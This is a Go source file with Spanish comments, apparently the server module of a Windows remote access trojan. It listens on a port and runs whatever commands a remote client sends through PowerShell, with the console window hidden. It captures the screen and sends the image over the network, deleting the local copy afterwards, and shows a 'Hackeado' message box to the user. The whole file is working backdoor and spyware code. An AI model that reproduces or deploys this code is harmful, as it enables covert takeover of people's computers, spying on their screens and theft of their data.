/*
en este modulo se maneja:

1. envio de comandos

2. ejecion de comandos

3. la puesta en escucha del programa en bucle
*/
package ejec

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"regexp"
	sistema "server/ejecuciones/sys"
	"strings"
	"syscall"
	"time"

	colorgo "github.com/Urban20/ColorGo"
	"github.com/kbinani/screenshot"
)

const TAMAÑO_BUFFER = 1024 // buffer para comandos promedios

var ROJO = colorgo.Formateo("ROJO")
var VERDE = colorgo.Formateo("VERDE")
var RESET = colorgo.Formateo("RESET")

// funcion similar a Envio( ) con la unica diferencia de que es para enviar imagenes por la red
func Enviar_img(conexion net.Conn, archivo string) error {
	buffer_tamaño := make([]byte, 8)

	imagen, open_error := os.Open(archivo)
	fmt.Println(VERDE + "\n-- se lee la imagen a enviar")

	if open_error != nil {
		return errors.New("[!] no se encuentra la imagen")
	}
	stat, stat_err := imagen.Stat() // obtengo stats de la imagen

	if stat_err != nil {
		fmt.Println("-- problema al obtener stats de imagen")
		return errors.New("hubo un problema obteniendo las dimensiones de la imagen")
	}
	img_tamaño := stat.Size()
	fmt.Println("-- tamaño de img obtenida :", img_tamaño)

	buffer_img := make([]byte, img_tamaño) // obtengo el tamaño y creo un buffer

	_, read_error := io.ReadFull(imagen, buffer_img)

	if read_error != nil {
		return errors.New("[!] error al codificar imagen")
	}
	fmt.Println("-- lectura de imagen correcta")

	binary.BigEndian.PutUint64(buffer_tamaño, uint64(img_tamaño)) //guardo el tamaño en el buffer en formato de bigendian
	// envio de datos de la imagen (tamaño e imagen en cuestion)
	Envio(conexion, buffer_tamaño)
	Envio(conexion, buffer_img)
	fmt.Println("-- envio de tamaño e imagen completado")

	error_close := imagen.Close()
	if error_close != nil {
		return error_close
	}
	err := os.Remove(archivo)
	if err != nil {
		return err
	}
	fmt.Print("-- eliminacion de imagen completado\n\n" + RESET)
	return nil
}

// Ss : screenshare -> maneja la logica cuando el cliente envia un paquete ss
func Ss(conexion net.Conn) error {
	nombre := os.TempDir() + "\\" + "captura.png" // ruta temporal donde va a parar la imagen
	bordes := screenshot.GetDisplayBounds(0)
	img, erro := screenshot.CaptureRect(bordes)
	if erro != nil {

		return erro
	}
	fmt.Println("-- captura de pantalla desplegada con exito")

	arch, arch_err := os.Create(nombre)

	if arch_err != nil {
		return arch_err
	}

	err := png.Encode(arch, img)
	if err != nil {
		return err
	}
	error_close := arch.Close()
	if error_close != nil {
		return error_close
	}
	error_enviar := Enviar_img(conexion, nombre)
	if error_enviar != nil {
		return error_enviar
	}
	return nil
}

// funcion que implementa la logica del comando cd
func Cd(entrada string, cliente net.Conn) {
	fmt.Println(VERDE + "se ejecuta el comando cd" + RESET)
	ruta, compile_error := regexp.Compile(`cd (\S+)`)
	if compile_error != nil {
		fmt.Println(compile_error)
	} else {
		re := ruta.FindStringSubmatch(entrada)
		if len(re) > 1 && len(re) < 3 {
			ruta_str := re[1]

			ch_error := os.Chdir(ruta_str)
			if ch_error != nil {
				Envio(cliente, []byte("[!] error cambiando ruta"))
				fmt.Println(VERDE + "error cambiando ruta" + RESET)

			} else {
				Envio(cliente, []byte("[*] ruta actualizada"))
				fmt.Println(VERDE + "ruta actualizada" + RESET)
			}
		}
	}

}

// maneja la ejecucion de comandos
func Ejecucion(entrada string) ([]byte, error) {
	comando := exec.Command("powershell", "-command", entrada)

	comando.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // ocultar ventana de cmd
	salida, comb_error := comando.CombinedOutput()
	return salida, comb_error

}

/*
funcion que envia el contenido de la ejecucion

salida -> byte - salida del cmd
*/
func Envio(conexion net.Conn, salida []byte) error {

	// envio del contenido del comando
	_, err := conexion.Write(salida)
	if err != nil {
		return err
	}
	return nil
}

// por cada comando se cierra la conexion y se acepta una nueva
func Escucha(conn net.Listener) {
	for {

		cliente, accept_error := conn.Accept()
		if accept_error != nil {
			fmt.Println(accept_error)
		}
		go Cliente(cliente)
	}
}

// maneja los comandos que llegan del cliente
func Cliente(cliente net.Conn) {

	defer cliente.Close()

	buffer := make([]byte, TAMAÑO_BUFFER)
	n, err := cliente.Read(buffer) //recibir el paquete del cliente
	if err != nil {
		fmt.Println(err)
	}
	entrada := string(buffer[:n]) // trasformar el paquete en string

	// deteccion de comando cd
	match_cd, _ := regexp.Match("cd ", []byte(entrada))

	// deteccion de comando msn
	match_msn, _ := regexp.Match("msn-", []byte(entrada))

	if match_cd { // logica de cd
		Cd(entrada, cliente)

	} else if match_msn { //logica de mensajes
		msg := strings.Split(entrada, "-")

		msgerr := sistema.MsgCartel("Hackeado", msg[1])

		if msgerr != nil {
			Envio(cliente, []byte(ROJO+fmt.Sprintf("\n- error al mostrar el mensaje: %s\n", msgerr.Error())+RESET))
		} else {
			Envio(cliente, []byte(VERDE+"\n- el usuario vió el mensaje\n"+RESET))
		}

	} else {
		switch entrada {
		case "ss": // logica de ss
			ch_err := make(chan error)
			contx, cancelar := context.WithTimeout(context.Background(), time.Second*10)
			defer cancelar()
			go func() {

				ch_err <- Ss(cliente)

			}()
			select {
			case <-contx.Done():
				Envio(cliente, []byte("[!] SS tardo demasiado en responder"))
			case erro := <-ch_err:
				if erro != nil {
					fmt.Println("[!] hubo un error durante el screenshot : ", erro)
				}
			}

		case "q": //salir del programa
			fmt.Println("[!] cliente desconectado")
			return

		default: // ejecucion de cualquier otro comando

			var ch_error = make(chan error)   // gestiona errores
			var ch_salida = make(chan []byte) // gestiona salidas de comando

			contexto, cancelar := context.WithTimeout(context.Background(), time.Second*5)

			defer cancelar()

			go func() {
				salida, err := Ejecucion(entrada)

				if err != nil {
					ch_error <- err
				} else {
					ch_salida <- salida
				}

			}()

			select {
			case <-contexto.Done():
				Envio(cliente, []byte("[!] tiempo de ejecucion agotado"))

			case salida := <-ch_salida:

				err := Envio(cliente, salida)

				if err != nil {
					fmt.Println("[!] hubo un problema al enviar")
				}

			case err := <-ch_error:

				fmt.Println("[!] hubo un problema: ", err)
			}

		}
	}
}
